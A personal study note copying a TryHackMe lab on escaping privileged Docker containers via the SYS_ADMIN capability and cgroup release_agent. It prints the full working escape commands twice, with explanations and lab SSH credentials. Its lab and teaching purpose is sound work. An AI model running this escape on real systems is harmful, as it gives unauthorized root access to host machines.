9.1**.** Understanding Capabilities

At it's fundamental, Linux capabilities are root permissions given to processes or executables within the Linux kernel. These privileges allow for the granular assignment of privileges - rather than just assigning them all.

These capabilities determine what permissions a Docker container has to the operating system, and how they are interacted with. Docker containers can run in two modes:

-   User mode
-   Privileged mode

Let's refer back to our diagram in Task 2 where we detail how containers run on the operating system to highlight the differences between these two modes:

![](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/privileged-container-layers.png)

Note how containers #1 and #2 are running is "user"/"normal" mode whereas container 3 is running in "privileged" mode. Containers running in "user" mode interact with the operating system through the Docker engine. Privileged containers, however, do not do this...instead, they bypass the Docker engine and have direct communication with the operating system.

9.2**.** What does this mean for us?

Well, if a container is running with privileged access to the operating system, we can effectively execute commands as root - perfect!

We can use a system package such as "libcap2-bin"'s `capsh`to list the capabilities our container has: `capsh --print`. I've highlighted a few interesting privileges that we have been given, but greatly encourage you to research into anymore that may be exploited! Privileges like these indicate that our container is running in privileged mode.

![](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/listcap2.png)

---

Before we begin to exploit this for ourselves, **you will need to deploy the new Instance attached to this Task.** The vulnerabilities of the previous VM conflict with this exploit.

9.3**.** Connecting to the container:  

Connect to your **new Instance** using SSH with the following details:

New Instance IP: 10.10.216.184

SSH Port: 2244

Username: root

Password: danny

Allowing a few minutes for the new Instance to deploy, I'm going to demonstrate leveraging the "sys_admin" capability. We can confirm we have this capability by _grepping_ the output of `capsh`:

![](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/getcap1.png)  

This capability permits us to do multiple of things (which is listed [here](https://linux.die.net/man/7/capabilities)), but we're going to focus on the ability given to use us via "sys_admin" to be able to [mount](https://linux.die.net/man/2/mount) files from the host OS into the container.

The code snippet below is based upon (but a modified) version of the [Proof of Concept (PoC) created by Trailofbits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.) where they detail the inner-workings to this exploit well.

**1.**  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

  

**2.**  echo 1 > /tmp/cgrp/x/notify_on_release

  

**3.**  host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

  

**4.**  echo "$host_path/exploit" > /tmp/cgrp/release_agent

  

**5.**  echo '#!/bin/sh' > /exploit

  

**6.**  echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit

  

**7.**  chmod a+x /exploit

  

**8.**  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

9.4**.** Let's briefly summarise what happens here:

**9.4.1.** We need to create a group to use the Linux kernel to write and execute our exploit. The kernel uses "cgroups" to manage processes on the operating system since we have capabilities to manage "cgroups" as root on the host, we'll mount this to "_/tmp/cgrp_" on the container.

**9.4.2**. For our exploit to execute, we'll need to tell Kernel to run our code. By adding "1" to "_/tmp/cgrp/x/notify_on_release_", we're telling the kernel to execute something once the "cgroup" finishes. [(Paul Menage., 2004)](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt)

**9.4.3.** We find out where the containers files are stored on the host and store it as a variable

**9.4.4.** Where we then echo the location of the containers files into our "_/exploit_" and then ultimately to the "release_agent" which is what will be executed by the "cgroup" once it is released.

**9.4.5.** Let's turn our exploit into a shell on the host

**9.4.6.** Execute a command to echo the host flag into a file named "flag.txt" in the container, once "_/exploit_" is executed

**9.4.7.** Make our exploit executable!

**9.4.8.** We create a process and store that into "_/tmp/cgrp/x/cgroup.procs_"  

  
**9.5**. Loot:

![](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/exploit1.png)

_Logging into the new Instance as "root" and executing the code snippet, resulting in container escape._

![](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/exploit2.png)  

_Showing that the command we executed (/exploit) has grabbed the file from the host operating system._

Answer the questions below

Contents of "flag.txt" from the host operating system

Connect to your **new Instance** using SSH with the following details:
New Instance IP: 10.10.216.184
SSH Port: 2244
Username: root
Password: danny

```
ssh root@10.10.216.184 -p 2244
```

![[Pasted image 20220413195209.png]]

```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

![[Pasted image 20220413195502.png]]